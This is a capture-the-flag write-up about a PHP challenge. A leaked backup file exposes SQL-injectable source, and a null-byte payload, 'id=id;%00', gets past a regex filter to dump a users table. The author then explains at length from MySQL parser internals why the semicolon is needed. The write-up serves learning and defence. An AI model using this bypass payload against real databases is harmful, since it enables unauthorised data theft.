# Are you brave enough?
**Description:** You have a simple challenge, prove your web skills and get the flag.

## The challenge

We are given the address of a web page, [https://brave.dctf-quals-17.def.camp/](https://brave.dctf-quals-17.def.camp).
It appears to be pretty simple, only returning `Nop`:

```
$ http GET https://brave.dctf-quals-17.def.camp/
HTTP/1.1 200 OK
Connection: keep-alive
Content-Length: 13
Content-Type: text/html; charset=UTF-8
Date: Mon, 02 Oct 2017 22:59:31 GMT
Server: nginx/1.10.3 (Ubuntu)
Strict-Transport-Security: max-age=31536000; includeSubdomains
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block

<h3>Nop.</h3>
```

The same thing happens if we use other http methods like `POST` or `PUT` or `PATCH`.

## The exploit

This took me way too long and is another reminder that you should automate checking for these: some editors create backup by appending a `~` to the file name. 
While `dirbuster` was forbidden, I should have used a small handcrafted list just checking very common stuff like backup files or `robots.txt` and I wouldn't have lost so much time on this.
As you may have already guessed now, we can find left over backup file from `index.php` that exposes the source code of the site:

```
$ http GET https://brave.dctf-quals-17.def.camp/index.php~
HTTP/1.1 200 OK
Accept-Ranges: bytes
Connection: keep-alive
Content-Length: 681
Date: Mon, 02 Oct 2017 23:07:34 GMT
ETag: "2a9-55a53c46ad0f1"
Last-Modified: Fri, 29 Sep 2017 13:11:47 GMT
Server: nginx/1.10.3 (Ubuntu)
Strict-Transport-Security: max-age=31536000; includeSubdomains
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block

<?php

$db  = mysqli_connect('localhost','web_brave','','web_brave');

$id  = @$_GET['id'];
$key = $db->real_escape_string(@$_GET['key']);

if(preg_match('/\s|[\(\)\'"\/\\=&\|1-9]|#|\/\*|into|file|case|group|order|having|limit|and|or|not|null|union|select|from|where|--/i', $id))
    die('Attack Detected. Try harder: '. $_SERVER['REMOTE_ADDR']); // attack detected

$query = "SELECT `id`,`name`,`key` FROM `users` WHERE `id` = $id AND `key` = '".$key."'";
$q = $db->query($query);

if($q->num_rows) {
    echo '<h3>Users:</h3><ul>';
    while($row = $q->fetch_array()) {
        echo '<li>'.$row['name'].'</li>';
    }

    echo '</ul>';
} else {
    die('<h3>Nop.</h3>');
}
```

This looks like a standard SQL injection, we only have to find a query that passes the regex. On example that works:

```
$ http GET 'https://brave.dctf-quals-17.def.camp/index.php?id=id;%00'
HTTP/1.1 200 OK
Connection: keep-alive
Content-Encoding: gzip
Content-Length: 128
Content-Type: text/html; charset=UTF-8
Date: Mon, 02 Oct 2017 23:14:59 GMT
Server: nginx/1.10.3 (Ubuntu)
Strict-Transport-Security: max-age=31536000; includeSubdomains
Vary: Accept-Encoding
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block

<h3>Users:</h3><ul><li>Try Harder</li><li>DCTF{602dcfeedd3aae23f05cf93d121907ec925bd70c50d78ac839ad48c0a93cfc54}</li></ul>
```

This request results in the following query:

```sql
SELECT `id`, `name`, `key` FROM `users` WHERE `id` = id;\0 AND `key` = '""';
```

The `id = id` condition is always true and `;\0` terminates the query so the remaining part of it is ignored.
This way, we can retrieve all entries in the database which reveals the flag.

## The interesting part: why is the semicolon required?

The standard explanation as for why the above query works is this: because C strings use the null byte to mark the end of the string, MySQL will incorrectly assume that the string ends at the null byte and thus ignore the rest.
By that explanation, MySQL interprets the query as if was:

```
SELECT `id`, `name`, `key` FROM `users` WHERE `id` = id;
```

But, that leaves an interesting question: why do we need the `;` character? Usually, MySQL does not require queries to be terminated by `;`, and indeed, the following query works:

```sql
SELECT `id`, `name`, `key` FROM `users` WHERE `id` = id
```

But this does *not* work:

```sql
SELECT `id`, `name`, `key` FROM `users` WHERE `id` = id\0 AND ...
```

So our theory that MySQL just ignores everything after a null byte does not explain everything.
Investigating further, we can take a look at the MySQL source code to see how it parses queries. 
The parser is written using bison, and the [top-level rule for parsing a query](https://github.com/mysql/mysql-server/blob/a533e2c786164af9bd276660b972d93649434297/sql/sql_yacc.yy#L1590) is:

```bison
query:
          END_OF_INPUT /* (1) empty query */
          {
            // irrelevant code omitted
            ...
          }
        | verb_clause /* (2) query followed by semicolon */
          {
            // irrelevant code omitted
            ...
          }
          ';'
          opt_end_of_input
        | verb_clause END_OF_INPUT /* (3) single query not followed by semicolon */
          {
            // irrelevant code omitted
            ...
          }
        ;

opt_end_of_input:
          /* empty */
        | END_OF_INPUT
        ;
```

What's this `END_OF_INPUT` token used here? Well, it turns out that there's actually *two* end of input tokens that are relevant here:

* token 0, `$eof` (internal bison token): This is the token that bison associates with the end of the input stream. It has the value 0, so it is generated whenever the lexer function `MYSQLlex` returns zero.
* token 420, `END_OF_INPUT`: This is a normal token (bison does not treat it specially in any way), but MySQL associates it with the end of input.

Now, the interesting thing is when these tokens are generated. The lexer knows the *real* length of the string, it does not need to rely on null byte terminators to determine it. But:

* `$eof` is generated whenever the lexer encounters a null byte, *except* if the null byte is at the end of the input (in that case, `END_OF_INPUT` is generated).

   See https://github.com/mysql/mysql-server/blob/a533e2c786164af9bd276660b972d93649434297/sql/sql_lex.cc#L2010, `MY_LEX_EOL` is the constant matching a null byte.
   When `lip->eof()` is false, we set the `state` to `MY_LEX_CHAR`, which means that the token that is returned is just the value of the current character.
   Because the current character is a null byte, the 0 token is returned which corresponds to the internal bison `$eof` token.
   
   When bison hits an `$eof` token, it will stop parsing. If the grammer was not fully matched at that point it is an error.
* `END_OF_INPUT` is only generated when we hit the *real* end of input, not when we hit a null byte.

Armed with these facts, we can now explain the behavior of MySQL:

* an empty query such as `""` parses correctly. This is rule `(1)` in the above code.
* a query without a terminating `;`, such as `SELECT * FROM users`, parses correctly because of rule `(3)`.
* a query without a terminating `;` but with a null byte followed by other data (example: `SELECT * FROM users\0some junk data`) will fail to parse. This is because rule `(3)` does not apply anymore: 
  it requires an `END_OF_INPUT` token, but a null byte only generates an `$eof` token. So bison gets an `$eof` token while it is still looking for the `END_OF_INPUT` token. This is an error.
* a query with a terminating `;` token followed by a null byte (such as `SELECT * FROM users;\0`) *will* work, because rule `(2)` above does not require the query to end with `END_OF_INPUT` (this make sense, because there may be other queries following the `;`). So bison will parse the query until the `;`, and at that point, hit `$eof`. But now the parse is successful, because it no longer *needs* an `END_OF_INPUT` token since that is not required if the query ends with `;`. 

To me, this feels like a bug in MySQL (MariaDB has the same issue). I think it would be better for MySQL to just fail parsing if a query contains a null byte that is not at the end of the query. I cannot think of a situation where the current behaviour would be useful, and disallowing null bytes in the middle of a query would prevent this security issue (of course, the proper solution would be to just use prepared statements / escape the `id` parameter, but it doesn't hurt to make these bugs at least harder to exploit.)
